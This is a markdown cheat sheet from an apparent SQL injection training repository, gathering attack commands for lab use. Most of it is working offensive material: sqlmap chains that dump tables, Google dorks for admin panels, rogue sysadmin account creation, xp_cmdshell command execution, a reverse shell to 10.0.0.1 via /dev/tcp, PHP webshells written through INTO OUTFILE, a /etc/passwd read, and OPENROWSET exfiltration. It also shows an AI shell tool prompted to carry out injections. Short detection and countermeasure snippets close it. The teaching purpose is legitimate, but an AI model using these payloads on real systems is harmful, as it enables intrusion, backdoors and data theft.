# SQL Injection Commands & Tools Cheat Sheet

Every tool invocation, sqlmap flag combination, and per-DBMS administrative syntax used in this repository, gathered
in one place for quick lookup during a lab session.

> ⚠️ Authorized testing only. See the repo [README](../README.md) for scope.

---

## sqlmap — Flag Quick Reference

Full context: [06 — SQL Injection Tools & AI](../06-sql-injection-tools-and-ai.md).

| Flag | Purpose |
|---|---|
| `-u "<url>"` | Target URL |
| `--data="<postdata>"` | POST data |
| `--cookie="<cookie>"` | HTTP Cookie header |
| `--batch` | Non-interactive; use defaults for every prompt |
| `--crawl=N` | Crawl N links deep from the target URL |
| `--random-agent` | Random `User-Agent` per request |
| `--level=N` | Test thoroughness, 1–5 |
| `--risk=N` | Test aggressiveness, 1–3 |
| `--technique=B` | Force Boolean-based blind technique |
| `--technique=E` | Force error-based technique |
| `--technique=T` | Force time-based blind technique |
| `--technique=U` | Force UNION query-based technique |
| `--dbs` | Enumerate databases |
| `-D <db>` | Target a specific database |
| `--tables` | Enumerate tables (in the `-D` database) |
| `-T <table>` | Target a specific table |
| `--columns` | Enumerate columns (in the `-T` table) |
| `-C <col1,col2>` | Target specific columns |
| `--dump` | Dump the targeted table/columns |

**The standard escalating recon chain:**

```bash
sqlmap -u "<url>" --batch --dbs
sqlmap -u "<url>" --batch -D <database> --tables
sqlmap -u "<url>" --batch -D <database> -T <table> --columns
sqlmap -u "<url>" --batch -D <database> -T <table> --dump
```

**Full one-liner (all four steps chained):**

```bash
sqlmap -u "<url>" --batch --dbs && \
sqlmap -u "<url>" --batch -D <database> --tables && \
sqlmap -u "<url>" --batch -D <database> -T <table> --columns && \
sqlmap -u "<url>" --batch -D <database> -T <table> -C <col1,col2> --dump
```

**AI-assisted discovery (via `sgpt` shell wrapper):**

```bash
sudo sgpt --shell "Check for all possible SQL injection on target url <url>"
sudo sgpt --shell "Check for Boolean based SQL injection on target url <url> and enumerate the database"
sudo sgpt --shell "Perform error based SQL injection on target url with parameter as <url> and enumerate the tables in <db> database"
sudo sgpt --shell "Check for time-based blind SQL injection on target url <url> and enumerate users table in <db> database"
sudo sgpt --shell "Check for UNION based SQL injection on target url with parameter as <url> and enumerate users table in <db> database"
```

## Damn Small SQLi Scanner (DSSS)

Full context: [09 — Detection Tools](../09-sql-injection-detection-tools.md).

```bash
python3 dsss.py -u "<url>" --cookie="<cookie>"
python3 dsss.py -u "<url>" --data="<postdata>"
python3 dsss.py --help
```

## Netcat (out-of-band listener)

Full context: [04 — Launching Attacks](../04-methodology-launching-attacks.md).

```bash
/home/tester/nc -nLp 80
```

## Google Dorks — Finding Admin Panels

Full context: [05 — Advanced SQL Injection](../05-methodology-advanced-sql-injection.md).

```
inurl:"adminlogin.aspx"
inurl:"admin/index.php"
inurl:"administrator.php"
inurl:"administrator.asp"
inurl:"/admin/"
inurl:"login.asp"
inurl:"/admin/login.php"
inurl:"login.aspx"
inurl:"login.php"
inurl:"admin/index.html"
inurl:"adminlogin.php"
```

---

## Per-DBMS Administrative & Enumeration Syntax

### Column Enumeration

| DBMS | Query |
|---|---|
| MSSQL | `SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename')` |
| MSSQL (alt) | `sp_columns tablename` |
| MySQL | `show columns from tablename` |
| Oracle | `SELECT * FROM all_tab_columns WHERE table_name='tablename'` |
| DB2 | `SELECT * FROM syscat.columns WHERE tabname= 'tablename'` |
| PostgreSQL | `SELECT attnum,attname from pg_class, pg_attribute WHERE relname= 'tablename' AND pg_class.oid=attrelid AND attnum > 0` |

### String Concatenation Syntax

| DBMS | Syntax |
|---|---|
| MySQL | `concat(,)`, `concat_ws(delim,)` |
| MSSQL | `+` |
| MS Access | `&` |
| Oracle | `\|\|` |
| DB2 | `concat`, `+`, or `\|\|` (supports all three) |
| PostgreSQL | `\|\|` |

### Comment Syntax

| DBMS | Syntax |
|---|---|
| MySQL | `--`, `/* */`, `#` |
| MSSQL | `--`, `/* */` |
| MS Access | *(not supported)* |
| Oracle | `--`, `/* */` |
| DB2 | `--` |
| PostgreSQL | `--`, `/* */` |

### Creating a Rogue Database Account

```sql
-- Microsoft SQL Server
exec sp_addlogin 'victor', 'Pass123'
exec sp_addsrvrolemember 'victor', 'sysadmin'

-- Oracle
CREATE USER victor IDENTIFIED BY Pass123
TEMPORARY TABLESPACE temp
DEFAULT TABLESPACE users;
GRANT CONNECT TO victor;
GRANT RESOURCE TO victor;

-- MS Access
CREATE USER victor IDENTIFIED BY 'Pass123'

-- MySQL
INSERT INTO mysql.user (user, host, password) VALUES ('victor', 'localhost', PASSWORD('Pass123'))
```

### Time-Delay Functions

| DBMS | Function |
|---|---|
| Microsoft SQL Server | `WAITFOR DELAY '0:0:10'--` (seconds) |
| MySQL | `BENCHMARK(howmanytimes, do_this)` |

### Enumeration Database Objects

| Oracle | MS Access | MySQL | MSSQL Server |
|---|---|---|---|
| `SYS.USER_OBJECTS` | `MSysAccessObjects` | `mysql.user` | `sys.objects` |
| `SYS.USER_TABLES` | `MSysACEs` | `mysql.db` | `sys.columns` |
| `SYS.USER_VIEWS` | `MSysObjects` | `mysql.tables_priv` | `sys.types` |
| `SYS.ALL_TABLES` | `MSysQueries` | | `sys.databases` |
| `SYS.USER_TAB_COLUMNS` | `MSysRelationships` | | |

### Re-enabling `xp_cmdshell` (MSSQL, requires `sysadmin`)

```sql
EXEC sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO
```

### OS Command Execution

```sql
-- MSSQL: run a command and read the output back through a temp table
'; exec master..xp_cmdshell 'ipconfig > test.txt' --
'; CREATE TABLE tmp (txt varchar(8000)); BULK INSERT tmp FROM 'test.txt' --
'; begin declare @data varchar(8000); set @data='| '; select @data=@data+txt+'|' from tmp where txt<@data; select @data as x into temp end --
' and 1 in (select substring(x,1,256) from temp) --
'; declare @var sysname; set @var = 'del test.txt'; EXEC master..xp_cmdshell @var; drop table temp; drop table tmp --

-- MSSQL: spawn an interactive reverse shell
EXEC xp_cmdshell 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'

-- MySQL: register OS-executing UDFs
CREATE FUNCTION sys_exec RETURNS int SONAME 'libudffmwgj.dll';
CREATE FUNCTION sys_eval RETURNS string SONAME 'libudffmwgj.dll';
```

### File System Interaction (MySQL)

```sql
-- Read a file
NULL UNION ALL SELECT LOAD_FILE('/etc/passwd')/*

-- Find the DB's working directory (to place a webshell)
SELECT @@datadir;

-- Write a PHP webshell
NULL UNION ALL SELECT NULL,NULL,NULL,NULL,'<?php system($_GET["command"]); ?>' INTO OUTFILE '/var/www/certifiedhacker.com/shell.php'/*
SELECT '<?php exec($_GET[''cmd'']); ?>' FROM usertable INTO dumpfile '/var/www/html/shell.php'
```

### Network Reconnaissance Commands (via `xp_cmdshell`)

```
ipconfig /all
tracert myIP
arp -a
nbtstat -c
netstat -ano
route print
nslookup a.com MyIP
ping 10.0.0.75
```

### Transferring a Database via `OPENROWSET`

```sql
'; insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=myIP,80;',
   'select * from mydatabase..hacked_sysdatabases')
select * from sys.sysdatabases --
```

---

## Snort Rule Template (SQLi Detection)

Full context: [09 — Detection Tools](../09-sql-injection-detection-tools.md).

```
alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg: "SQL Injection - Paranoid";
    flow:to_server, established;
    uricontent:".pl";
    pcre:"/(\')|(\%27)|(\-\-)|(#)|(\%23)/ix";
    classtype:Web-application-attack;
    sid:9099; rev:5;
)
```

## Countermeasure Code Snippets

Full context: [08 — Countermeasures](../08-sql-injection-countermeasures.md).

```csharp
// Type-safe SQL parameters (C# / ADO.NET)
SqlDataAdapter myCommand = new SqlDataAdapter(
    "SELECT aut_lname, aut_fname FROM Authors WHERE aut_id = @aut_id", conn);
SqlParameter parm = myCommand.SelectCommand.Parameters.Add("@aut_id", SqlDbType.VarChar, 11);
parm.Value = Login.Text;
```

```java
// Output encoding (Java)
myQuery = myQuery.replace("'", "\\'");
```

```csharp
// Escaping LIKE-clause wildcards
s = s.Replace("[", "[[]");
s = s.Replace("%", "[%]");
s = s.Replace("_", "[_]");
```

```sql
-- Wrapping dynamic T-SQL parameters
SET @temp = N'SELECT * FROM employees WHERE emp_lname = ''' + REPLACE(@emp_lname,'''','''''') + N'''';
```

---

**See also:** [`payloads-cheatsheet.md`](payloads-cheatsheet.md) for the full payload/testing-string reference.
